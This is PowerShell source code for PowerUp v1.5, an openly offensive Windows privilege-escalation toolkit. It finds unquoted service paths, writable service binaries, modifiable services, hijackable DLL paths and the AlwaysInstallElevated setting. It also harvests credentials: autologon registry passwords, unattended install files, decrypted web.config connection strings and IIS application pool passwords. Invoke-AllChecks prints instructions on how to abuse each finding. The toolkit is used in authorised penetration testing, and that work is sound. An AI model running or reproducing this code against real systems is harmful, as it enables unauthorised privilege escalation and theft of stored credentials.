<#

PowerUp v1.5

Various methods to abuse local services to assist
with escalation on Windows systems.

See README.md for more information.

by: @harmj0y

#>


function Get-ServiceUnquoted {
    <#
    .SYNOPSIS
    Returns the name and binary path for services with unquoted paths
    that also have a space in the name.
    
    .DESCRIPTION
    This function finds all services whose binary paths are unquoted,
    and where a space exists in the path name.
    
    .EXAMPLE
    > $services = Get-ServiceUnquoted
    Get a set of potentially exploitable services.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
    #>

    # find all paths to service .exe's that have a space in the path and aren't quoted
    $VulnServices = gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | where {-not $_.pathname.StartsWith("`"")} | where {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -match ".* .*"}
    
    if ($VulnServices) {
        foreach ($service in $VulnServices){
            $out = new-object psobject 
            $out | add-member Noteproperty 'ServiceName' $service.name
            $out | add-member Noteproperty 'Path' $service.pathname
            $out
        }
    }
}


function Get-ServiceEXEPerms {
    <#
    .SYNOPSIS
    Returns the name and path for any service where the current 
    user can write to the associated binary.
    
    .DESCRIPTION
    This function finds all services where the current user can 
    write to the associated binary. If the associated binary is 
    overwritten, privileges may be able to be escalated.
    
    .EXAMPLE
    > $services = Get-ServiceEXEPerms
    Get a set of potentially exploitable services.
    #> 
    
    $ErrorActionPreference = "SilentlyContinue"

    # get all paths to service executables that aren't in C:\Windows\System32\*
    $services = gwmi win32_service | ?{$_} | where {($_.pathname -ne $null) -and ($_.pathname -notmatch ".*system32.*")} 
    
    if ($services) {
        # try to open each for writing, print the name if successful
        foreach ($service in $services){
            try{
                # strip out any arguments and get just the executable
                $path = ($service.pathname.Substring(0, $service.pathname.toLower().IndexOf(".exe") + 4)).Replace('"',"")

                # exclude these two false-positive binaries
                if ($(Test-Path $path) -and $(-not $path.Contains("NisSrv.exe")) -and $(-not $path.Contains("MsMpEng.exe"))) {
                    # try to open the file for writing, immediately closing it
                    $file = Get-Item $path -Force
                    $stream = $file.OpenWrite()
                    $stream.Close() | Out-Null

                    $out = new-object psobject 
                    $out | add-member Noteproperty 'ServiceName' $service.name
                    $out | add-member Noteproperty 'Path' $service.pathname
                    $out
                }
            }
            catch{
                # if we have access but it's open by another process, return it
                if (($_.ToString()).contains("by another process")){                    
                    $out = new-object psobject 
                    $out | add-member Noteproperty 'ServiceName' $service.name
                    $out | add-member Noteproperty 'Path' $service.pathname
                    $out
                }
            } 
        }
    }
    $ErrorActionPreference = "Continue"
}


function Get-ServicePerms {
    <#
    .SYNOPSIS
    Returns a list of services that the user can modify.
    
    .DESCRIPTION
    This function enumerates all available services and tries to
    open the service for modification, returning the service object
    if the process doesn't failed.
    
    .EXAMPLE
    > $services = Get-ServicePerms
    Get a set of potentially exploitable services.
    #> 


    $services = gwmi win32_service | ?{$_}
    
    if ($services) {
        foreach ($service in $services){

            # try to change error control of a service to its existing value
            $result = sc.exe config $($service.Name) error= $($service.ErrorControl)

            # means the change was successful
            if ($result -contains "[SC] ChangeServiceConfig SUCCESS"){
                $out = new-object psobject 
                $out | add-member Noteproperty 'ServiceName' $service.name
                $out | add-member Noteproperty 'Path' $service.pathname
                $out
            }
        }
    }
}


function Invoke-FindPathHijack {
    <#
    .SYNOPSIS
    Returns any %PATH% .DLL hijacking opportunities.

    .DESCRIPTION
    This function first checks if the current %PATH% has 
    any directories that are writeable by the current user.

    .EXAMPLE
    > Invoke-FindPathDLLHijack
    Finds all %PATH% .DLL hijacking opportunities.

    .LINK
    http://www.greyhathacker.net/?p=738
    #>

    [CmdletBinding()]
    Param()

    $ErrorActionPreference = "SilentlyContinue"

    $Paths = (gi env:path).value.split(';') | where {$_ -ne ""}

    foreach ($Path in $Paths){

        $Path = $Path.Replace('"',"")
        if (-not $Path.EndsWith("\")){
            $Path = $Path + "\"
        }

        # reference - http://stackoverflow.com/questions/9735449/how-to-verify-whether-the-share-has-write-access
        $testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())

        # if the path doesn't exist, try to create the folder
        # before testing it for write
        if(-not $(Test-Path -Path $Path)){
            try {
                # try to create the folder
                New-Item -ItemType directory -Path $Path | Out-Null
                echo $Null > $testPath
                $Path
            }
            catch {}
            finally {
                # remove the directory
                Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        else{
            # if the folder already exists
            try {
                echo $Null > $testPath
                $Path
            }
            catch {} 
            finally {
                # Try to remove the item again just to be safe
                Remove-Item $testPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    $ErrorActionPreference = "Continue"
}


function Get-RegAlwaysInstallElevated {
    <#
    .SYNOPSIS
    Checks if the AlwaysInstallElevated registry key is set.

    .DESCRIPTION
    This function checks if the AlwaysInstallElevated registry key
    is set, meaing that MSI files are always run with SYSTEM
    level privileges.

    .OUTPUTS
    System.bool. True if the add succeeded, false otherwise.

    .EXAMPLE
    > Get-RegAlwaysInstallElevated
    Checks if the AlwaysInstallElevated registry key is set.
    #>

    [CmdletBinding()]
    Param()
    
    $ErrorActionPreference = "SilentlyContinue"

    if (test-Path "hklm:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "hklm:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "hkcu:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $true
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $false
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $false
        }
    }
    else{
        Write-Verbose "hklm:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $false
    }
    $ErrorActionPreference = "Continue"
}


function Get-RegAutoLogon {
    <#
    .SYNOPSIS
    Checks for Autologon credentials in the registry.

    .DESCRIPTION
    This function checks for DefaultUserName/DefaultPassword in
    the Winlogin registry section if the AutoAdminLogon key is set.

    .EXAMPLE
    > Get-RegAutoLogon
    Finds any autologon credentials left in the registry.

    .LINK
    https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
    #>

    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon.AutoAdminLogon -ne 0){

        $DefaultDomainName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword

        if ($DefaultUserName) {            
            $out = new-object psobject 
            $out | add-member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $out | add-member Noteproperty 'DefaultUserName' $DefaultUserName
            $out | add-member Noteproperty 'DefaultPassword' $DefaultPassword
            $out
        }

        $AltDefaultDomainName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "hklm:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($AltDefaultUserName) {
            $out = new-object psobject 
            $out | add-member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $out | add-member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $out | add-member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $out
        }
    }
}   


function Get-UnattendedInstallFiles {
    <#
    .SYNOPSIS
    Finds remaining unattended installation files.

    .DESCRIPTION
    This function checks four locations for remaining
    unattended installation files, which may have 
    deployment credentials.

    .OUTPUTS
    System.Array. An array of any found file locations.

    .EXAMPLE
    > Get-UnattendedInstallFiles
    Finds any remaining unattended installation files.

    .LINK
    http://www.fuzzysecurity.com/tutorials/16.html
    #>
    
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep.inf",
                            (join-path $env:windir "\Panther\Unattended.xml"),
                            (join-path $env:windir "\Panther\Unattend\Unattended.xml") )

    # test the existence of each path and return anything found
    $SearchLocations | where { Test-Path $_ }
    $ErrorActionPreference = "Continue"
}



function Get-Webconfig {   
    <#
        .SYNOPSIS
           This script will recover cleartext and encrypted connection strings from all web.config 
           files on the system.  Also, it will decrypt them if needed.
        
            Author: Scott Sutherland - 2014, NetSPI
            Author: Antti Rantasaari - 2014, NetSPI
       
        .DESCRIPTION
           This script will identify all of the web.config files on the system and recover the  
           connection strings used to support authentication to backend databases.  If needed, the 
           script will also decrypt the connection strings on the fly.  The output supports the 
           pipeline which can be used to convert all of the results into a pretty table by piping 
           to format-table.
       
        .EXAMPLE
           Return a list of cleartext and decrypted connect strings from web.config files.
       
           PS C:\>get-webconfig        
           user   : s1admin
           pass   : s1password
           dbserv : 192.168.1.103\server1
           vdir   : C:\test2
           path   : C:\test2\web.config
           encr   : No
           
           user   : s1user
           pass   : s1password
           dbserv : 192.168.1.103\server1
           vdir   : C:\inetpub\wwwroot
           path   : C:\inetpub\wwwroot\web.config
           encr   : Yes
       
        .EXAMPLE
           Return a list of clear text and decrypted connect strings from web.config files.
       
           PS C:\>get-webconfig | Format-Table -Autosize
           
           user    pass       dbserv                vdir               path                          encr
           ----    ----       ------                ----               ----                          ----
           s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
           s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
           s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
           s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
           s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 
         .LINK
           https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
           http://www.netspi.com
           https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
           http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
           http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx   
         .NOTES
           Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
           for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
        #>

    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("c:\windows\system32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $DataTable.Columns.Add("user") | Out-Null
        $DataTable.Columns.Add("pass") | Out-Null  
        $DataTable.Columns.Add("dbserv") | Out-Null
        $DataTable.Columns.Add("vdir") | Out-Null
        $DataTable.Columns.Add("path") | Out-Null
        $DataTable.Columns.Add("encr") | Out-Null

        # Get list of virtual directories in IIS 
        c:\windows\system32\inetsrv\appcmd.exe list vdir /text:physicalpath | 
        foreach { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*")
            {            
                $EnvarName = "`$env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | 
            foreach{
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add)
                {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    foreach {

                        [string]$MyConString = $_.connectionString  
                        $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                        $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                        $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                        $ConfVdir = $CurrentVdir
                        $ConfPath = $CurrentPath
                        $ConfEnc = "No"
                        $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                    }  

                }else{

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending  |  select fullname -First 1              

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName))
                    {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (get-item $env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Del $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $env:temp).FullName'
                        invoke-expression $aspnet_regiis_cmd | Out-Null

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add| 
                            foreach {

                                [string]$MyConString = $_.connectionString  
                                $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                $ConfVdir = $CurrentVdir
                                $ConfPath = $CurrentPath
                                $ConfEnc = "Yes"
                                $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc) | Out-Null                    
                            }  

                        }else{
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False                      
                        }
                    }else{
                        Write-Verbose "aspnet_regiis.exe does not exist in the default location."
                        $False
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 )
        {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | select user,pass,dbserv,vdir,path,encr -Unique       
        }else{

            # Status user
            Write-Verbose "No connectionStrings found."
            $False
        }     

    }else{
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }
    $ErrorActionPreference = "Continue"
}


function Get-ApplicationHost
{   
     <#
        .SYNOPSIS
        This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
           
        .DESCRIPTION
        This script will decrypt and recover application pool and virtual directory passwords
        from the applicationHost.config file on the system.  The output supports the 
        pipeline which can be used to convert all of the results into a pretty table by piping 
        to format-table.
           
        .EXAMPLE
        Return application pool and virtual directory passwords from the applicationHost.config on the system.
           
        PS C:\>get-ApplicationHost         
        user    : PoolUser1
        pass    : PoolParty1!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool1
        user    : PoolUser2
        pass    : PoolParty2!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool2
        user    : VdirUser1
        pass    : VdirPassword1!
        type    : Virtual Directory
        vdir    : site1/vdir1/
        apppool : NA
        user    : VdirUser2
        pass    : VdirPassword2!
        type    : Virtual Directory
        vdir    : site2/
        apppool : NA
           
        .EXAMPLE
        Return a list of cleartext and decrypted connect strings from web.config files.
           
        PS C:\>get-ApplicationHost | Format-Table -Autosize
               
        user          pass               type              vdir         apppool
        ----          ----               ----              ----         -------
        PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
        PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2 
        VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA     
        VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA     
        .LINK
        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
        .NOTES
        Author: Scott Sutherland - 2014, NetSPI
        Version: Get-ApplicationHost v1.0
        Comments: Should work on IIS 6 and Above
    #>

    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("c:\windows\system32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $DataTable.Columns.Add("user") | Out-Null
        $DataTable.Columns.Add("pass") | Out-Null  
        $DataTable.Columns.Add("type") | Out-Null
        $DataTable.Columns.Add("vdir") | Out-Null
        $DataTable.Columns.Add("apppool") | Out-Null

        # Get list of application pools
        c:\windows\system32\inetsrv\appcmd.exe list apppools /text:name | 
        foreach { 
        
            #Get application pool name
            $PoolName = $_
        
            #Get username           
            $PoolUserCmd = 'c:\windows\system32\inetsrv\appcmd.exe list apppool "'+$PoolName+'" /text:processmodel.username'
            $PoolUser = invoke-expression $PoolUserCmd 
                    
            #Get password
            $PoolPasswordCmd = 'c:\windows\system32\inetsrv\appcmd.exe list apppool "'+$PoolName+'" /text:processmodel.password'
            $PoolPassword = invoke-expression $PoolPasswordCmd 

            #Check if credentials exists
            IF ($PoolPassword -ne "")
            {
                #Add credentials to database
                $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) | Out-Null  
            }
        }

        # Get list of virtual directories
        c:\windows\system32\inetsrv\appcmd.exe list vdir /text:vdir.name | 
        foreach { 

            #Get Virtual Directory Name
            $VdirName = $_
        
            #Get username           
            $VdirUserCmd = 'c:\windows\system32\inetsrv\appcmd list vdir "'+$VdirName+'" /text:userName'
            $VdirUser = invoke-expression $VdirUserCmd
                    
            #Get password       
            $VdirPasswordCmd = 'c:\windows\system32\inetsrv\appcmd list vdir "'+$VdirName+'" /text:password'
            $VdirPassword = invoke-expression $VdirPasswordCmd

            #Check if credentials exists
            IF ($VdirPassword -ne "")
            {
                #Add credentials to database
                $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA') | Out-Null  
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | select user,pass,type,vdir,apppool -Unique       
        }
        else{
            # Status user
            Write-Verbose "No application pool or virtual directory passwords were found."
            $False
        }     
    }else{
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }
    $ErrorActionPreference = "Continue"
}


function Invoke-AllChecks {
    <#
    .SYNOPSIS
    Runs all current Windows privesc checks.

    .DESCRIPTION
    This function runs all functions that check for various
    Windows privilege escalation opportunities.

    .EXAMPLE
    > Invoke-AllChecks
    Runs all escalation checks, output statuses for whatever's
    found.
    #>

    # # the array for our initial status output messages
    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "`n[+] Current user already has local administrative privileges!"
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."
        if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ){
            "`n[+] User is in a local group that grants administrative privileges!"
            "`n[*] Run a BypassUAC attack to elevate privileges to admin."
        }
    }

    # Windows service checks
    "`n`n[*] Checking for unquoted service paths..."
    $UnquotedServices = Get-ServiceUnquoted
    if ($UnquotedServices){
        "`n[*] Use 'Write-UserAddServiceBinary' or 'Write-CMDServiceBinary' to abuse"
        foreach ($Service in $UnquotedServices){
            "`n[+] Unquoted service path: $($Service.ServiceName) - $($Service.Path)"
        }
    }

    "`n`n[*] Checking service executable permissions..."
    $ServiceEXEs = Get-ServiceEXEPerms
    if ($ServiceEXEs){
        "`n[*] Use 'Write-ServiceEXE -ServiceName SVC' or 'Write-ServiceEXECMD' to abuse"
        foreach ($ServiceEXE in $ServiceEXEs){
            "`n[+] Vulnerable service executable: $($ServiceEXE.ServiceName) - $($ServiceEXE.Path)"
        }
    }

    "`n`n[*] Checking service permissions..."
    $VulnServices = Get-ServicePerms
    if ($VulnServices){
        "`n[*] Use 'Invoke-ServiceUserAdd -ServiceName SVC' or 'Invoke-ServiceCMD' to abuse"
        foreach ($Service in $VulnServices){
            "`n[+] Vulnerable service: $($Service.ServiceName) - $($Service.Path)"
        }
    }

    # other checks

    "`n`n[*] Checking for unattended install files..."
    $InstallFiles = Get-UnattendedInstallFiles
    if ($InstallFiles){
        "`n[*] Examine install files for possible passwords"
        foreach ($File in $InstallFiles){
            "`n[+] Unattended install file: $File"
        }
    }

    "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
    $HijackablePaths = Invoke-FindPathHijack
    if ($HijackablePaths){
        if($HijackablePaths) {
            "`n[*] Write a .dll to 'PATH\wlbsctrl.dll' to abuse"
            foreach ($Path in $HijackablePaths){
                "`n[+] Hijackable .dll path: $Path"
            }
        }
    }

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegAlwaysInstallElevated){
        "`n[*] Use 'Write-UserAddMSI' to abuse"
        "`n[+] AlwaysInstallElevated is enabled for this machine!"
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $AutologonCreds = Get-RegAutoLogon
    if ($AutologonCreds){
        try{
            if (($AutologonCreds.DefaultUserName) -and (-not ($AutologonCreds.DefaultUserName -eq ''))) {
                "`n[+] Autologon default credentials: $($AutologonCreds.DefaultDomainName), $($AutologonCreds.DefaultUserName),  $($AutologonCreds.DefaultPassword),"
            }
        }
        catch {}
        try {
            if (($AutologonCreds.AltDefaultUserName) -and (-not($AutologonCreds.AltDefaultUserName -eq ''))) {

                "`n[+] Autologon alt credentials: $($AutologonCreds.AltDefaultDomainName), $($AutologonCreds.AltDefaultUserName),  $($AutologonCreds.AltDefaultPassword),"
            }
        }
        catch {}
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $webconfig = Get-Webconfig
    if($webconfig){
        "`n" + $webconfig
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $apphost = Get-ApplicationHost
    if($ApplicationHost){
        "`n" + $apphost 
    }
    "`n"
}